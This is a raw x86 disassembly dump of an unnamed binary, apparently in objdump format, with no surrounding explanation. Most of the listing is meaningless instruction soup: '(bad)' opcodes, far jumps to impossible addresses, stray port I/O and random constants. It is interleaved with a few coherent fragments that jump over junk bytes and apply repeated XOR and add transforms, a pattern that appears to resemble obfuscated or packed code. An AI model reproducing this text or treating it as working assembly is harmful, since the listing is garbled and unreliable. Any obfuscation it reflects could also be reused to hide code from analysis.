  408bea:	mov    ah,BYTE PTR [ebx+0x76a38cf3]
  408bf0:	ja     0x408bdc
  408bf2:	inc    ecx
  408bf3:	xchg   ebx,eax
  408bf4:	jmp    0x408bcf
  408bf6:	xchg   ebx,eax
  408bf7:	lds    ebp,FWORD PTR [esi]
  408bf9:	data16 (bad) 
  408bfb:	sub    eax,0x29fadc71
  408c00:	div    DWORD PTR [esi+0x418cf667]
  408c06:	or     ecx,DWORD PTR [ebp-0x3a470418]
  408c0c:	xchg   DWORD PTR [edx+0x62805b5],ecx
  408c12:	sbb    eax,0xc793663c
  408c17:	inc    esi
  408c18:	sbb    al,0xd5
  408c1a:	fild   DWORD PTR [esi+edx*4-0x5b]
  408c1e:	shl    DWORD PTR [edx+eax*1],0x7c
  408c22:	je     0x408c27
  408c24:	lahf   
  408c25:	dec    ebp
  408c26:	dec    ebx
  408c27:	inc    esp
  408c28:	mov    dl,0x4c
  408c2a:	jae    0x408ca8
  408c2c:	mov    ebp,0xa7d11c5a
  408c31:	dec    ebx
  408c32:	out    dx,eax
  408c33:	shl    edx,0x68
  408c36:	sar    BYTE PTR [edx+0x704336f0],cl
  408c3c:	idiv   DWORD PTR [eax-0x22345bdf]
  408c42:	cli    
  408c43:	gs sahf 
  408c45:	sahf   
  408c46:	shl    BYTE PTR ds:[bp+si+0x11],0x8e
  408c4c:	cmp    BYTE PTR ds:0x496cdd98,al
  408c52:	shl    edi,0x86
  408c55:	lahf   
  408c56:	test   al,0x4e
  408c58:	mov    cl,0xfb
  408c5a:	adc    dl,BYTE PTR [edi+eiz*2+0x26bcf8]
  408c61:	jns    0x408c25
  408c63:	(bad)  
  408c64:	sbb    eax,0xe6404712
  408c69:	inc    esi
  408c6a:	imul   esp,DWORD PTR [ebp+0x4d],0xffffffb6
  408c6e:	add    DWORD PTR [edi],esp
  408c70:	cwde   
  408c71:	(bad)  
  408c72:	cli    
  408c73:	ret    
  408c74:	jecxz  0x408ceb
  408c76:	int    0x73
  408c78:	and    DWORD PTR [edi-0x2d2a76d9],0xfffffff6
  408c7f:	sub    al,0xc5
  408c81:	stc    
  408c82:	sub    ebx,ebx
  408c84:	leave  
  408c85:	retf   
  408c86:	xor    eax,0x15d2e9fa
  408c8b:	cmp    al,0x83
  408c8d:	jp     0x408ca7
  408c8f:	inc    esp
  408c90:	f2xm1  
  408c92:	xchg   ecx,eax
  408c93:	xchg   ecx,eax
  408c94:	adc    DWORD PTR [edx+ebx*4],ecx
  408c97:	push   ecx
  408c98:	je     0x408d07
  408c9a:	and    BYTE PTR [esp+edi*8+0x74],0xba
  408c9f:	jae    0x408c25
  408ca1:	pop    ds
  408ca2:	pop    ds
  408ca3:	jg     0x408cb4
  408ca5:	pop    ebx
  408ca6:	adc    dh,0xbc
  408ca9:	xchg   esp,eax
  408caa:	cwde   
  408cab:	xor    DWORD PTR [ecx-0x7b],0x32
  408caf:	push   edi
  408cb0:	(bad)  
  408cb1:	popf   
  408cb2:	and    eax,0xb2069e4b
  408cb7:	not    BYTE PTR [ecx-0x64793a2a]
  408cbd:	adc    edx,edi
  408cbf:	pop    ebx
  408cc0:	sahf   
  408cc1:	jmp    0xe0c3cd05
  408cc6:	ror    BYTE PTR [ebx],0xbd
  408cc9:	pop    edi
  408cca:	int    0x26
  408ccc:	dec    ebp
  408ccd:	popf   
  408cce:	mov    ebx,0x548b8653
  408cd3:	cmp    eax,0x87841f47
  408cd8:	gs jns 0x408d17
  408cdb:	jns    0x408d3a
  408cdd:	add    ch,BYTE PTR [ecx-0x2d]
  408ce0:	hlt    
  408ce1:	aam    0xf7
  408ce3:	aaa    
  408ce4:	adc    ebx,DWORD PTR ds:0x9004b70f
  408cea:	xor    eax,0x8a43
  408cef:	add    eax,edi
  408cf1:	mov    edi,DWORD PTR [ebp-0x14]
  408cf4:	mov    BYTE PTR [ebp+edi*1-0x58],al
  408cf8:	mov    eax,DWORD PTR [ebp-0xc]
  408cfb:	inc    edx
  408cfc:	cmp    edx,eax
  408cfe:	jne    0x408b9f
  408d04:	pop    edi
  408d05:	pop    ebx
  408d06:	mov    eax,DWORD PTR [ebp-0x8]
  408d09:	mov    edx,DWORD PTR [ebp+0x10]
  408d0c:	xor    eax,ecx
  408d0e:	jmp    0x408e37
  408d13:	inc    esp
  408d14:	(bad)  
  408d15:	jno    0x408cee
  408d17:	icebp  
  408d18:	stc    
  408d19:	js     0x408d80
  408d1b:	xchg   esp,eax
  408d1c:	ins    BYTE PTR es:[edi],dx
  408d1d:	retf   0x44a3
  408d20:	jmp    0x2f79c23e
  408d25:	jle    0x408da5
  408d27:	or     bh,BYTE PTR [edi+0x7e]
  408d2a:	jle    0x408d1b
  408d2c:	and    dh,cl
  408d2e:	test   DWORD PTR [eax],ecx
  408d30:	popf   
  408d31:	repnz enter 0xdab4,0x7b
  408d36:	xchg   ecx,eax
  408d37:	jge    0x408d75
  408d39:	jecxz  0x408d37
  408d3b:	push   ss
  408d3c:	xlat   BYTE PTR ds:[ebx]
  408d3d:	mov    dh,0x6b
  408d3f:	les    eax,FWORD PTR ds:0x2a358054
  408d45:	hlt    
  408d46:	push   edi
  408d47:	(bad)  
  408d48:	fnstsw WORD PTR [esi-0x518a3204]
  408d4e:	ja     0x408d88
  408d50:	js     0x408d2f
  408d52:	pop    edx
  408d53:	inc    ecx
  408d54:	xor    esp,DWORD PTR [esi]
  408d56:	push   0x736a0902
  408d5b:	inc    esi
  408d5c:	xchg   DWORD PTR [ebx],eax
  408d5e:	push   ecx
  408d5f:	jno    0x408d12
  408d61:	xchg   edi,eax
  408d62:	mov    ebp,DWORD PTR [edi+0x1]
  408d65:	cmp    al,0xb
  408d67:	shl    DWORD PTR [ebx+0x54],1
  408d6a:	push   ds
  408d6b:	pushf  
  408d6c:	cmc    
  408d6d:	jge    0x408dbc
  408d6f:	test   eax,0x6011a446
  408d74:	outs   dx,BYTE PTR ds:[esi]
  408d75:	sbb    al,0xb
  408d77:	rcr    DWORD PTR [esi+0x4d3ce43f],1
  408d7d:	jbe    0x408da4
  408d7f:	add    DWORD PTR [ebx-0x9e0d1f9],0xffffffd6
  408d86:	mov    cl,0x7f
  408d88:	jl     0x408d18
  408d8a:	out    dx,al
  408d8b:	add    BYTE PTR [eax+0xaeed8ac],0x64
  408d92:	mov    esi,0xacd5ecb9
  408d97:	es nop
  408d99:	mov    dh,0x1e
  408d9b:	or     BYTE PTR [edx],ch
  408d9d:	xchg   ebx,eax
  408d9e:	push   es
  408d9f:	out    0x5e,al
  408da1:	add    bh,ah
  408da3:	loop   0x408d6a
  408da5:	sbb    al,0x92
  408da7:	mov    eax,0xe80a0158
  408dac:	cs cmp dl,bh
  408daf:	jp     0x408d78
  408db1:	(bad)  
  408db2:	std    
  408db3:	test   esi,eax
  408db5:	mov    BYTE PTR [ebp+0x6675812d],0x4d
  408dbc:	(bad)  
  408dbd:	dec    esp
  408dbe:	cli    
  408dbf:	push   ecx
  408dc0:	sbb    ebx,eax
  408dc2:	out    0x68,eax
  408dc4:	cdq    
  408dc5:	push   eax
  408dc6:	sbb    eax,0xfbf66b56
  408dcb:	mov    eax,0x3a1dcdf2
  408dd0:	daa    
  408dd1:	and    al,0x9e
  408dd3:	cli    
  408dd4:	jno    0x408da9
  408dd6:	xchg   ebx,eax
  408dd7:	mov    edi,0x2870420d
  408ddc:	scas   al,BYTE PTR es:[edi]
  408ddd:	in     al,dx
  408dde:	sti    
  408ddf:	(bad)  
  408de0:	or     ebx,DWORD PTR [ebx+0x41]
  408de3:	dec    edx
  408de4:	retf   0xcbb
  408de7:	popa   
  408de8:	ret    0x1155
  408deb:	mov    bl,BYTE PTR [ebx]
  408ded:	pop    esi
  408dee:	jg     0x408d72
  408df0:	cmp    DWORD PTR [edx-0x56],0x9
  408df4:	ror    BYTE PTR [ecx+0x1a22ac5d],0x15
  408dfb:	shr    BYTE PTR [eax+edx*4-0x5402ea8f],cl
  408e02:	int3   
  408e03:	out    dx,eax
  408e04:	ja     0x408d8e
  408e06:	stc    
  408e07:	sub    edi,esi
  408e09:	jnp    0x408ddc
  408e0b:	and    DWORD PTR [ebx+ebp*4],ebp
  408e0e:	sub    eax,0x4f8455c
  408e13:	jmp    0xa149:0x8bc67e0b
  408e1a:	js     0x408def
  408e1c:	xchg   DWORD PTR [eax+0x44019d71],ebp
  408e22:	rcr    BYTE PTR cs:[ebp-0x61b9c278],cl
  408e29:	jg     0x408e4a
  408e2b:	test   DWORD PTR [ebp+0x6d6124d4],ebp
  408e31:	cmp    eax,0xdf7a45a0
  408e36:	jge    0x408e3b
  408e38:	(bad)  
  408e39:	mov    DWORD PTR [edx],eax
  408e3b:	jmp    0x408f64
  408e40:	dec    eax
  408e41:	sub    ecx,DWORD PTR [edx]
  408e43:	lock imul edx,DWORD PTR [ecx+0x1c4aeb48],0x6913de2b
  408e4e:	mov    esp,0x7e2c3505
  408e53:	jle    0x408e5f
  408e55:	jg     0x408ed5
  408e57:	jle    0x408e14
  408e59:	jb     0x408df7
  408e5b:	leave  
  408e5c:	aaa    
  408e5d:	xor    ecx,esp
  408e5f:	enter  0xc6b9,0xdd
  408e63:	scas   eax,DWORD PTR es:[edi]
  408e64:	shr    BYTE PTR [ebp-0x34],cl
  408e67:	dec    eax
  408e68:	pop    esi
  408e69:	cmp    esi,DWORD PTR [edx+ecx*8]
  408e6c:	push   ss
  408e6d:	xor    eax,0x54040777
  408e72:	lock sbb al,0x19
  408e75:	sti    
  408e76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e77:	mov    edx,0x535e06a2
  408e7c:	pushf  
  408e7d:	xchg   ecx,eax
  408e7e:	inc    edi
  408e7f:	stos   DWORD PTR es:[edi],eax
  408e80:	dec    edi
  408e81:	ins    DWORD PTR es:[edi],dx
  408e82:	outs   dx,BYTE PTR ds:[esi]
  408e83:	iret   
  408e84:	ret    0x50a9
  408e87:	dec    ebx
  408e88:	dec    esi
  408e89:	or     esp,0xffffffff
  408e8c:	cmc    
  408e8d:	dec    edx
  408e8e:	fldenv [ecx-0x2f]
  408e91:	into   
  408e92:	sbb    dh,bl
  408e94:	sub    DWORD PTR [ebx-0x2bba54d4],eax
  408e9a:	push   esi
  408e9b:	adc    eax,0x31059db8
  408ea0:	pop    ss
  408ea1:	cmp    edx,ecx
  408ea3:	ficomp DWORD PTR [eax+0x200f1929]
  408ea9:	or     BYTE PTR [edi],0x64
  408eac:	dec    esi
  408ead:	push   edi
  408eae:	xor    dh,bh
  408eb0:	loope  0x408e9a
  408eb2:	xchg   BYTE PTR [edx],bl
  408eb4:	cmp    dh,al
  408eb6:	cmc    
  408eb7:	lods   al,BYTE PTR ds:[esi]
  408eb8:	out    dx,al
  408eb9:	pop    esi
  408eba:	mov    ebx,0x269d6e43
  408ebf:	adc    cl,BYTE PTR [eax-0x13]
  408ec2:	adc    DWORD PTR [ecx+0x65],esi
  408ec5:	mov    bl,0x23
  408ec7:	mov    ch,0x2c
  408ec9:	pop    ds
  408eca:	repz jno 0x408e72
  408ecd:	cmp    esp,esp
  408ecf:	or     bh,BYTE PTR [edx]
  408ed1:	ss daa 
  408ed3:	int    0x38
  408ed5:	mov    ah,0xe3
  408ed7:	dec    ebp
  408ed8:	int    0x2b
  408eda:	and    edi,DWORD PTR [esi+0x74]
  408edd:	enter  0xf430,0x58
  408ee1:	fdiv   DWORD PTR [eax-0x6df30]
  408ee7:	sbb    eax,DWORD PTR [ebp-0x26]
  408eea:	inc    edx
  408eeb:	mov    dh,BYTE PTR [eax]
  408eed:	mov    eax,esp
  408eef:	std    
  408ef0:	shl    BYTE PTR [eax-0x62],cl
  408ef3:	push   ds
  408ef4:	int3   
  408ef5:	loope  0x408f6e
  408ef7:	aaa    
  408ef8:	shl    DWORD PTR [ecx],0x50
  408efb:	sar    BYTE PTR [esi+ebx*4-0x6c],1
  408eff:	inc    ecx
  408f00:	or     ecx,ecx
  408f02:	repnz lods al,BYTE PTR ds:[esi]
  408f04:	sub    dh,bl
  408f06:	jb     0x408eef
  408f08:	and    al,BYTE PTR [edx+0xf937780]
  408f0e:	or     BYTE PTR [ecx],bl
  408f10:	mov    ch,0xf5
  408f12:	mov    DWORD PTR [edx+ecx*4],esi
  408f15:	inc    eax
  408f16:	mov    ch,BYTE PTR [eax-0x7e2446fb]
  408f1c:	mov    edx,0xe6167bd9
  408f21:	or     DWORD PTR [ecx+0x26],ecx
  408f24:	xchg   ebp,eax
  408f25:	xacquire xchg DWORD PTR [esi-0x15],edi
  408f29:	aam    0x1a
  408f2b:	xchg   BYTE PTR [ecx],bh
  408f2d:	pop    esi
  408f2e:	xchg   edx,eax
  408f2f:	lods   eax,DWORD PTR ds:[esi]
  408f30:	scas   eax,DWORD PTR es:[edi]
  408f31:	and    eax,0xbd132b3
  408f36:	fdiv   DWORD PTR [ebx+0x3ef41f89]
  408f3c:	adc    al,0x6
  408f3e:	(bad)  
  408f3f:	scas   eax,DWORD PTR es:[edi]
  408f40:	jns    0x408f99
  408f42:	mov    ecx,0x8b043e36
  408f47:	and    BYTE PTR [ebx-0x4998190b],0x4d
  408f4e:	sahf   
  408f4f:	in     eax,dx
  408f50:	sub    DWORD PTR [eax-0x272364ab],esi
  408f56:	jno    0x408f4f
  408f58:	mov    ah,0x40
  408f5a:	test   BYTE PTR [eax],0x2f
  408f5d:	add    edx,DWORD PTR [eax-0x1e3fd9b1]
  408f63:	jmp    0x3438d4f3
  408f68:	rol    DWORD PTR [ebx],0xc6
  408f6b:	mov    DWORD PTR [ebp+0x8],eax
  408f6e:	mov    eax,DWORD PTR [ebp+0x8]
  408f71:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408f75:	mov    dl,BYTE PTR [ebp-0x1]
  408f78:	cmp    al,dl
  408f7a:	je     0x4090e6
  408f80:	mov    eax,DWORD PTR [ebp+0x8]
  408f83:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408f87:	mov    edx,DWORD PTR [ebp+0xc]
  408f8a:	cmp    al,BYTE PTR [edx]
  408f8c:	jne    0x40935e
  408f92:	mov    eax,DWORD PTR [ebp-0x8]
  408f95:	mov    edx,DWORD PTR [ebp+0xc]
  408f98:	jmp    0x4090c1
  408f9d:	jmp    0x7952d498
  408fa2:	loopne 0x40901d
  408fa4:	mov    ch,0xbe
  408fa6:	jmp    0xd3d9b935
  408fab:	mov    ebx,0x7e2dc18a
  408fb0:	jle    0x408fbc
  408fb2:	jg     0x409032
  408fb4:	jle    0x408fc2
  408fb6:	das    
  408fb7:	rcl    ch,1
  408fb9:	sbb    ch,al
  408fbb:	ret    
  408fbc:	inc    esp
  408fbd:	sbb    eax,0x83eb6eae
  408fc2:	mov    edi,0xa26dbb2f
  408fc7:	mov    bl,0x92
  408fc9:	adc    BYTE PTR [ebx+0xb],0xf6
  408fcd:	dec    esp
  408fce:	aad    0x46
  408fd0:	enter  0x56e0,0xd8
  408fd4:	and    esi,ecx
  408fd6:	adc    eax,0xd2615d60
  408fdb:	adc    DWORD PTR [edi],edi
  408fdd:	dec    edi
  408fde:	mov    esi,0xadef664f
  408fe3:	out    0xd7,eax
  408fe5:	xor    edx,DWORD PTR [edx+0xd]
  408fe8:	call   0xe86a:0x724bde8
  408fef:	popf   
  408ff0:	add    eax,0x56e254ac
  408ff5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ff6:	push   esp
  408ff7:	mov    ebp,0x68ef0bdd
  408ffc:	in     eax,dx
  408ffd:	xor    al,0x4
  408fff:	inc    esi
  409000:	cmp    BYTE PTR [edi+eax*8+0x5f],al
  409004:	sbb    ch,dl
  409006:	fidivr WORD PTR [ebx]
  409008:	enter  0x573c,0xf0
  40900c:	mov    al,ds:0x1d285382
  409011:	gs test al,0xc0
  409014:	mov    ch,0x3e
  409016:	scas   al,BYTE PTR es:[edi]
  409017:	mov    ecx,0x699ef7ad
  40901c:	push   es
  40901d:	les    edx,FWORD PTR [ebx+ebx*2-0x47]
  409021:	loop   0x408fe9
  409023:	or     BYTE PTR [ebp-0x64],dh
  409026:	mov    ebp,0xa8f4df37
  40902b:	add    al,0xa3
  40902d:	or     cl,ah
  40902f:	in     eax,dx
  409030:	mov    BYTE PTR es:[esi+eax*4-0x2],cl
  409035:	cli    
  409036:	gs mov edx,0x49f3f4ba
  40903c:	adc    edi,ebx
  40903e:	mov    ?,WORD PTR [eax+0x49]
  409041:	jae    0x409088
  409043:	and    DWORD PTR [esi+0x18],esi
  409046:	mov    ebx,0xc67338ee
  40904b:	mov    dh,0x0
  40904d:	jne    0x4090a3
  40904f:	popf   
  409050:	ins    DWORD PTR es:[edi],dx
  409051:	test   al,0xc2
  409053:	jg     0x40904b
  409055:	and    DWORD PTR [eax],0x2a
  409058:	xchg   edx,eax
  409059:	repz adc al,0x73
  40905c:	(bad)  
  40905d:	mov    edi,0xf5de7545
  409062:	ins    DWORD PTR es:[edi],dx
  409063:	std    
  409064:	jmp    0x7242:0x5075028
  40906b:	stos   DWORD PTR es:[edi],eax
  40906c:	scas   eax,DWORD PTR es:[edi]
  40906d:	test   BYTE PTR [ebx],bl
  40906f:	outs   dx,DWORD PTR cs:[esi]
  409071:	ret    
  409072:	xchg   ebp,eax
  409073:	pop    ebp
  409074:	xchg   ecx,eax
  409075:	sbb    eax,0xb46dbba8
  40907a:	pop    ds
  40907b:	or     edx,DWORD PTR [esi+esi*4+0x20e60aa0]
  409082:	das    
  409083:	dec    bp
  409085:	aas    
  409086:	push   ebx
  409087:	rol    DWORD PTR [ebx-0x4b],0xf6
  40908b:	stos   BYTE PTR es:[edi],al
  40908c:	fst    st(4)
  40908e:	call   0xed18:0x5cba95a7
  409095:	icebp  
  409096:	repnz add esi,eax
  409099:	push   ds
  40909a:	xchg   edi,eax
  40909b:	fidiv  WORD PTR [ebx-0x6e]
  40909e:	pop    edi
  40909f:	or     edx,DWORD PTR ds:0x7f0ddb60
  4090a5:	test   DWORD PTR [ebp+0x4ec29150],ebp
  4090ab:	and    dl,ah
  4090ad:	add    ecx,0xffffffed
  4090b0:	lods   al,BYTE PTR ds:[esi]
  4090b1:	cmp    eax,0x4248d638
  4090b6:	je     0x409043
  4090b8:	ficom  DWORD PTR [edx+0x718ec3a8]
  4090be:	mov    bl,0x56
  4090c0:	je     0x4090d1
  4090c2:	mov    esi,0x3c13312
  4090c7:	(bad)  
  4090c8:	cmp    edx,eax
  4090ca:	je     0x409229
  4090d0:	mov    DWORD PTR [ebp-0x18],0x705fd8e
  4090d7:	lea    eax,[ebp-0x18]
  4090da:	mov    DWORD PTR [ebp-0x14],eax
  4090dd:	mov    eax,DWORD PTR [ebp-0x14]
  4090e0:	add    DWORD PTR [eax],0x705fa8e
  4090e6:	mov    eax,DWORD PTR [ebp-0x10]
  4090e9:	jmp    0x409212
  4090ee:	lods   eax,DWORD PTR ds:[esi]
  4090ef:	lock test BYTE PTR [ecx+edi*4],al
  4090f3:	sbb    BYTE PTR [ebp-0x47188557],ch
  4090f9:	daa    
  4090fa:	aad    0x77
  4090fc:	sti    
  4090fd:	sbb    ch,0x22
  409100:	jle    0x409180
  409102:	or     bh,BYTE PTR [edi+0x7e]
  409105:	jle    0x40909e
  409107:	mov    ds,WORD PTR [edx]
  409109:	mov    al,ds:0xf8b701d4
  40910e:	sub    DWORD PTR [ecx-0x7c565ff2],esi
  409114:	dec    edx
  409115:	icebp  
  409116:	(bad)  [edi]
  409118:	repz add al,0xab
  40911b:	sbb    eax,0x95229e87
  409120:	iret   
  409121:	push   esi
  409122:	jbe    0x409104
  409124:	lods   al,BYTE PTR ds:[esi]
  409125:	mov    cl,0x4d
  409127:	dec    esp
  409128:	es out 0x14,eax
  40912b:	les    ecx,FWORD PTR [esi]
  40912d:	or     edi,ebx
  40912f:	test   eax,0x7fd2a464
  409134:	sub    al,0x3
  409136:	push   es
  409137:	xchg   esi,eax
  409138:	or     BYTE PTR [edi+0x2efcd23f],dl
  40913e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40913f:	ins    DWORD PTR es:[edi],dx
  409140:	pop    es
  409141:	(bad)  
  409142:	jae    0x409133
  409144:	(bad)  
  409145:	dec    esp
  409146:	push   ebx
  409147:	daa    
  409148:	ret    
  409149:	sahf   
  40914a:	pop    ds
  40914b:	fcmovu st,st(0)
  40914d:	out    0x7f,al
  40914f:	arpl   WORD PTR [eax],di
  409151:	mov    ?,WORD PTR ds:0xd86bc0f3
  409157:	test   al,0x39
  409159:	and    al,dh
  40915b:	call   0x81a3d152
  409160:	sbb    BYTE PTR ds:0x70837fb8,0xb9
  409167:	inc    esi
  409168:	pop    ebp
  409169:	scas   al,BYTE PTR es:[edi]
  40916a:	rcl    DWORD PTR [edx],1
  40916c:	mov    al,0x9a
  40916e:	mov    ebp,0xf77e4bb7
  409173:	jbe    0x409156
  409175:	imul   esi,DWORD PTR [edi-0x28806f48],0xffffffd6
  40917c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40917d:	xor    BYTE PTR [esi],ah
  40917f:	and    ebp,DWORD PTR [eax+ebx*2-0x19d5c82a]
  409186:	xchg   ebp,eax
  409187:	xor    DWORD PTR [edi],edx
  409189:	sub    eax,0x3eeeff2
  40918e:	adc    ch,al
  409190:	lock cmp BYTE PTR [edx+edi*8],bh
  409194:	stos   BYTE PTR es:[edi],al
  409195:	mov    ss,WORD PTR ds:0xd414c0fb
  40919b:	push   ds
  40919c:	inc    esi
  40919d:	retf   
  40919e:	or     eax,0x7bb95490
  4091a3:	jno    0x4091d3
  4091a5:	dec    ebx
  4091a6:	adc    eax,0x7c3d54bc
  4091ab:	mov    bl,0x47
  4091ad:	les    edi,FWORD PTR [ecx+0x3f3902c7]
  4091b3:	xchg   DWORD PTR [ebx+0x493daab7],esp
  4091b9:	xor    eax,0xb4fde815
  4091be:	shr    BYTE PTR [ebx-0x50209e22],cl
  4091c4:	(bad)  
  4091c5:	push   esi
  4091c6:	loopne 0x409203
  4091c8:	xchg   ecx,eax
  4091c9:	fistp  QWORD PTR [ecx+0x1eddb83d]
  4091cf:	xor    cl,ch
  4091d1:	pop    ebp
  4091d2:	ss ret 0x3b92
  4091d6:	retf   
  4091d7:	push   cs
  4091d8:	dec    esp
  4091d9:	daa    
  4091da:	pop    eax
  4091db:	push   ds
  4091dc:	in     eax,0x87
  4091de:	pop    es
  4091df:	mov    ecx,0x52e37785
  4091e4:	pop    ebx
  4091e5:	fwait
  4091e6:	dec    esi
  4091e7:	dec    ecx
  4091e8:	fadd   DWORD PTR [di+0x553b]
  4091ed:	xchg   ebx,eax
  4091ee:	xchg   ecx,eax
  4091ef:	fcomp  QWORD PTR [edi-0xdde22f7]
  4091f5:	push   0x809ff3f5
  4091fa:	dec    eax
  4091fb:	push   esi
  4091fc:	mov    al,ds:0x82e1684e
  409201:	stos   BYTE PTR es:[edi],al
  409202:	call   DWORD PTR [edi+0x5a4e2853]
  409208:	fld    TBYTE PTR [ecx+0x34]
  40920b:	loope  0x40924c
  40920d:	adc    al,0x5e
  40920f:	lods   eax,DWORD PTR ds:[esi]
  409210:	adc    al,0x38
  409212:	mov    edx,DWORD PTR [ebp+0x8]
  409215:	xor    eax,ecx
  409217:	lea    eax,[eax+edx*1+0x32729f]
  40921e:	mov    DWORD PTR [ebp+0x8],eax
  409221:	inc    DWORD PTR [ebp+0xc]
  409224:	jmp    0x408f6e
  409229:	mov    eax,DWORD PTR [ebp-0x10]
  40922c:	xor    eax,ecx
  40922e:	jmp    0x409357
  409233:	or     DWORD PTR ds:0xd93acb2e,ebx
  409239:	stc    
  40923a:	(bad)  [ecx+0x687a7c7]
  409240:	inc    edx
  409241:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409242:	or     eax,0x7e7e23e9
  409247:	or     bh,BYTE PTR [edi+0x7e]
  40924a:	jle    0x40923b
  40924c:	mov    gs,ebp
  40924e:	pop    esp
  40924f:	xchg   esp,eax
  409250:	fwait
  409251:	sbb    edx,DWORD PTR [eax+ebx*4+0x134a2f3e]
  409258:	popa   
  409259:	repnz xchg ebx,eax
  40925b:	es or  al,0xae
  40925e:	push   eax
  40925f:	pusha  
  409260:	xlat   BYTE PTR ds:[ebx]
  409261:	cdq    
  409262:	dec    eax
  409263:	clc    
  409264:	pop    ss
  409265:	sub    edx,ebp
  409267:	jnp    0x40929c
  409269:	call   0x8787:0x9d2555b8
  409270:	shl    DWORD PTR [eax],1
  409272:	mov    cl,0x1f
  409274:	test   DWORD PTR [eax-0xb541f35],0xd445157
  40927e:	xor    al,0xcd
  409280:	mov    ebp,0x55c14c5
  409285:	xor    BYTE PTR [esi-0x30770f6],dh
  40928b:	inc    edi
  40928c:	push   edi
  40928d:	pop    eax
  40928e:	cmp    eax,0xe31fecdd
  409293:	rcl    DWORD PTR [eax+0x47],cl
  409296:	clc    
  409297:	sub    BYTE PTR [eax+0x2c],ch
  40929a:	mov    al,ds:0xdfd8dc4f
  40929f:	mov    ds:0x3ebbcee6,al
  4092a4:	pushf  
  4092a5:	xor    eax,0x6481a317
  4092aa:	in     eax,0xbe
  4092ac:	js     0x40924c
  4092ae:	aam    0xba
  4092b0:	sbb    DWORD PTR [edi],eax
  4092b2:	in     al,dx
  4092b3:	ret    0xa43c
  4092b6:	xor    eax,0x6ea57722
  4092bb:	xchg   ecx,eax
  4092bc:	leave  
  4092bd:	add    al,0xed
  4092bf:	scas   al,BYTE PTR es:[edi]
  4092c0:	sbb    eax,0x8ac27444
  4092c5:	(bad)  
  4092c6:	je     0x409255
  4092c8:	out    dx,al
  4092c9:	in     al,dx
  4092ca:	scas   al,BYTE PTR es:[edi]
  4092cb:	and    bl,BYTE PTR ds:0x66c9796
  4092d1:	pop    ebp
  4092d2:	ret    0x5768
  4092d5:	pop    es
  4092d6:	jb     0x409311
  4092d8:	sbb    edx,0x4057fd99
  4092de:	jmp    FWORD PTR [eax-0x2]
  4092e1:	bound  esp,QWORD PTR [edi-0x770acc0c]
  4092e7:	push   0x494b0262
  4092ec:	cs push edi
  4092ee:	inc    esi
  4092ef:	sbb    eax,0xdc62df8e
  4092f4:	mov    bl,0xfc
  4092f6:	cwde   
  4092f7:	jge    0x4092a1
  4092f9:	dec    eax
  4092fa:	stos   DWORD PTR es:[edi],eax
  4092fb:	int    0xe9
  4092fd:	push   edx
  4092fe:	or     cl,BYTE PTR cs:0x65f225ed
  409305:	or     al,0xcb
  409307:	pop    esp
  409308:	mov    ds:0xcb00065e,eax
  40930d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40930e:	stos   DWORD PTR es:[edi],eax
  40930f:	or     esp,esi
  409311:	aas    
  409312:	cmp    al,0x56
  409314:	mov    edx,0x1f6bdeb3
  409319:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40931a:	je     0x409395
  40931c:	aaa    
  40931d:	mov    bl,0xa
  40931f:	xor    edi,DWORD PTR [ecx+0x5ce7009b]
  409325:	(bad)
  409328:	sub    edi,ebx
  40932a:	add    al,0xfd
  40932c:	inc    ebx
  40932d:	sub    BYTE PTR [ebx+0x3a],al
  409330:	xor    BYTE PTR [esi+0x788d34b9],ah
  409336:	push   ds
  409337:	ret    0xfc50
  40933a:	xor    bl,ah
  40933c:	sub    ebx,edi
  40933e:	inc    edx
  40933f:	xor    dl,BYTE PTR ss:[ecx-0x4b]
  409343:	cmp    BYTE PTR [eax+0x5373ef21],ah
  409349:	xchg   edx,eax
  40934a:	mov    ebx,DWORD PTR [edx-0x38445a4a]
  409350:	and    edx,DWORD PTR [ecx+0x1fe4c204]
  409356:	mov    ecx,DWORD PTR ds:[ebp+0x10]
  40935a:	add    eax,esi
  40935c:	mov    DWORD PTR [ecx],eax
  40935e:	pop    esi
  40935f:	leave  
  409360:	ret    0xc
  409363:	push   ebp
  409364:	mov    ebp,esp
  409366:	push   ecx
  409367:	not    eax
  409369:	mov    DWORD PTR [ebp-0x4],0xf89c853c
  409370:	mov    eax,DWORD PTR [ebp-0x4]
  409373:	mov    edx,DWORD PTR [ebp+0x10]
  409376:	add    DWORD PTR ds:0x4235d7,ebx
  40937c:	mov    ecx,0x7510859
  409381:	adc    DWORD PTR ds:0x41235c,0x4235d7
  40938b:	xor    eax,ecx
  40938d:	add    eax,0x32729f
  409392:	and    DWORD PTR ds:0x412368,0x417e41
  40939c:	mov    DWORD PTR [edx],eax
  40939e:	mov    eax,DWORD PTR [ebp+0xc]
  4093a1:	and    DWORD PTR ds:0x4235cf,0x0
  4093ab:	jmp    0x4093bd
  4093b0:	mov    edx,DWORD PTR ds:0x4235cf
  4093b6:	inc    edx
  4093b7:	mov    DWORD PTR ds:0x4235cf,edx
  4093bd:	cmp    DWORD PTR ds:0x4235cf,0x14
  4093c4:	jae    0x4093eb
  4093ca:	cmp    DWORD PTR ds:0x4235cf,0x1c
  4093d1:	jne    0x4093e0
  4093d7:	push   DWORD PTR [ebp-0x20]
  4093da:	call   DWORD PTR ds:0x40d1e8
  4093e0:	jmp    0x4093b0
  4093e5:	sub    DWORD PTR ds:0x41237c,ebx
  4093eb:	xor    eax,ecx
  4093ed:	adc    edx,DWORD PTR ds:0x412360
  4093f3:	push   esi
  4093f4:	add    esi,edx
  4093f6:	mov    esi,DWORD PTR [ebp+0x10]
  4093f9:	mov    edx,0x32729f
  4093fe:	add    eax,edx
  409400:	xor    DWORD PTR ds:0x41abda,0x417e49
  40940a:	mov    DWORD PTR [esi+0x4],eax
  40940d:	mov    eax,ds:0x412398
  409412:	mov    esi,DWORD PTR ds:0x420127
  409418:	sub    esi,eax
  40941a:	xor    eax,DWORD PTR [eax+esi*1]
  40941d:	mov    eax,DWORD PTR [ebp+0x14]
  409420:	mov    esi,DWORD PTR [ebp+0x10]
  409423:	mov    DWORD PTR [esi+0x8],eax
